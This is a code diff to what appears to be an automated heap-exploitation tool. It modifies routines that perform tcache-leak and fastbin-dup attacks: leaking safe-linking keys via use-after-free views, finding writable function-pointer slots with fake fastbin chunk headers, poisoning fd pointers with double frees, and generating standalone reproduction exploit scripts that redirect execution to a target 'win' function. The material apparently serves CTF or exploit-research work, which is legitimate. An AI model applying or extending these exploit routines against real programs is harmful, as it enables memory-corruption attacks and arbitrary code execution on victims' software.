@@ -517,10 +517,7 @@ def _heap_leak_run(spawn, width, roles, trig, target, win_addr, model, *, safe, 
         idx_op(free, 0)                                  # free A -> A.fd == mangle(A, NULL) == A>>12
         idx_op(free, 1)                                  # free B -> bin [B, A], count 2
         leak = idx_op(view, 0)                            # UAF view of the TAIL A -> the clean key
-        cands = [int(x, 16) for x in re.findall(rb"0x([0-9a-fA-F]{5,12})", leak)]
-        raw = leak if isinstance(leak, bytes) else leak.encode("latin1")
-        cands += [int.from_bytes(raw[i:i + 8], "little") for i in range(0, max(0, len(raw) - 7))]
-        key = next((v for v in cands if heap_groom.is_plausible_heap_key(v)), None)
+        key = heap_groom.parse_heap_key(leak if isinstance(leak, bytes) else leak.encode("latin1"))
         if key is None:
             return None, b""
         # B sits one chunk from A, so B>>12 == A>>12 == key except across a page boundary -- and a
@@ -595,25 +592,39 @@ def _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, *, glibc=None):
 _TCACHE_COUNT = 7                                        # glibc default per-bin tcache capacity
 
 
-def _fastbin_fake_targets(exe, target_bytes):
-    """16-aligned writable fn-pointer slots whose PRECEDING word is a valid fastbin size -- the
-    "fake chunk" a fastbin dup must land a chunk on. Unlike tcache, the fastbin malloc path checks
+#: Fastbin size classes to try when the fake chunk's size field is only known at run time (the
+#: static image shows nothing), smallest first -- the common ones cover almost every real target.
+_FASTBIN_REQ_CLASSES = (0x18, 0x28, 0x38, 0x48, 0x58, 0x68, 0x78)
+
+
+def _fastbin_fake_targets(exe, target_bytes, *, max_runtime: int = 6):
+    """16-aligned writable fn-pointer slots a fastbin dup can land a chunk on, each as
+    (target, chunk_size | None). Unlike tcache, the fastbin malloc path checks
     `fastbin_index(chunksize(victim)) == idx`, so the target's chunk header (the 8 bytes at
-    target-0x8, read here from the ELF image) has to look like a fastbin-size chunk or malloc
-    aborts "memory corruption (fast)". Returns [(target, chunk_size)], best (smallest size) first;
-    this precondition is exactly why fastbin dup is narrower than the tcache poison."""
+    target-0x8) has to look like a fastbin-size chunk or malloc aborts "memory corruption (fast)".
+
+    Two tiers:
+      * STATIC -- the size word is in the ELF image (a .data initializer): the size is KNOWN, so
+        the dup uses exactly it. These come first (smallest size first).
+      * RUNTIME -- the slot is in .bss, or its preceding word is set at run time, so the image shows
+        nothing: emitted with size=None (bounded to `max_runtime`), and the dup TRIES the common
+        fastbin classes, with the execution oracle confirming the one whose runtime size matches.
+    This closes the case where the fake size exists only at run time; it stays sound because a wrong
+    class simply aborts without winning. The fake-chunk precondition is why fastbin dup is narrower
+    than the tcache poison."""
     from . import elfstatic
     from .heap import is_fastbin
-    out = []
+    static, runtime = [], []
     for t in _writable_globals(exe):                     # already 16-aligned, code-referenced
         off = elfstatic.vaddr_to_offset(target_bytes, t - 8)
-        if off is None or off + 8 > len(target_bytes):
-            continue
-        size = int.from_bytes(target_bytes[off:off + 8], "little") & ~0x0F
-        if is_fastbin(size):
-            out.append((t, size))
-    out.sort(key=lambda ts: ts[1])
-    return out
+        size = None
+        if off is not None and off + 8 <= len(target_bytes):
+            v = int.from_bytes(target_bytes[off:off + 8], "little") & ~0x0F
+            if is_fastbin(v):
+                size = v
+        (static if size else runtime).append((t, size))
+    static.sort(key=lambda ts: ts[1])
+    return static + runtime[:max_runtime]
 
 
 def _fastbin_dup_run(spawn, width, roles, trig, target, req, win_addr, model, *, safe, corrupt):
@@ -665,8 +676,7 @@ def _fastbin_dup_run(spawn, width, roles, trig, target, req, win_addr, model, *,
         a_idx, b_idx = n_up - 2, n_up - 1
         free_i(0)                                         # L -> tcache: A.fd == A>>12
         leak = view_i(0)                                  # UAF view of the lone tcache chunk -> key
-        cands = [int.from_bytes(leak[i:i + 8], "little") for i in range(0, max(0, len(leak) - 7))]
-        key = next((v for v in cands if heap_groom.is_plausible_heap_key(v)), None)
+        key = heap_groom.parse_heap_key(leak if isinstance(leak, bytes) else leak.encode("latin1"))
         if key is None:
             return None, b""
         for i in range(1, _TCACHE_COUNT):                 # fill the tcache to its cap (L + these)
@@ -723,25 +733,28 @@ def _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir,
     spawn = _pie_spawn(workdir, exe)
     attempts = 0
     for tgt, size in targets:
-        req = max(size - 8, 1)
-        for trig in list(opts) + [None]:
-            if ctx.should_cancel() or attempts >= 150:
-                return None
-            attempts += 1
-            key, pos = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
-                                        safe=safe, corrupt=False)
-            if key is None:
-                continue
-            pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
-            if not any(_WIN_OUT.search(ln) for ln in pos_lines):
-                continue
-            _, neg = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
-                                      safe=safe, corrupt=True)
-            neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
-            if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
-                ctx.progress(msg=(f"fastbin dup: double-free a/b/a, fd := key^{tgt:#x} over the "
-                                  f"fake chunk at {tgt:#x} (size {size:#x}) := &{win_name} -> ran"))
-                return roles, trig, tgt, size, key
+        # Known static size -> use exactly it; runtime (unknown) -> try the common fastbin classes.
+        reqs = [max(size - 8, 1)] if size else list(_FASTBIN_REQ_CLASSES)
+        for req in reqs:
+            for trig in list(opts) + [None]:
+                if ctx.should_cancel() or attempts >= 220:
+                    return None
+                attempts += 1
+                key, pos = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
+                                            safe=safe, corrupt=False)
+                if key is None:
+                    continue
+                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
+                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
+                    continue
+                _, neg = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
+                                          safe=safe, corrupt=True)
+                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
+                if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
+                    used = req + 8
+                    ctx.progress(msg=(f"fastbin dup: double-free a/b/a, fd := key^{tgt:#x} over the "
+                                      f"fake chunk at {tgt:#x} (size {used:#x}) := &{win_name} -> ran"))
+                    return roles, trig, tgt, used, key
     return None
 
 
@@ -1477,8 +1490,9 @@ def _heap_leak_repro_script(win_addr, roles, trig, target, safe) -> bytes:
         f"send({free!r}+'\\n'); send('0\\n'); drain()\n"               # free A -> A.fd == A>>12
         f"send({free!r}+'\\n'); send('1\\n'); drain()\n"               # free B -> bin [B,A]
         f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view of tail A -> key
-        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{5,12})',out)]\n"
+        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{3,16})',out)]\n"
         "cands+=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
+        "cands+=[int.from_bytes(ln[:8],'little') for ln in out.split(b'\\n') if ln]\n"
         "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
         "assert key is not None, 'no heap key disclosed by the UAF view'\n"
         "fd=(key^TARGET) if SAFE else TARGET\n"
@@ -1588,7 +1602,9 @@ def _fastbin_dup_repro_script(win_addr, roles, trig, target, req, safe) -> bytes
         f"for _ in range({n_up}): alloc()\n"                           # L + fillers + a + b
         "free(0)\n"                                                    # L -> tcache
         f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view -> key
-        "cands=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
+        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{3,16})',out)]\n"
+        "cands+=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
+        "cands+=[int.from_bytes(ln[:8],'little') for ln in out.split(b'\\n') if ln]\n"
         "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
         "assert key is not None, 'no heap key disclosed'\n"
         "for i in range(1,CNT): free(i)\n"                             # fill tcache to cap
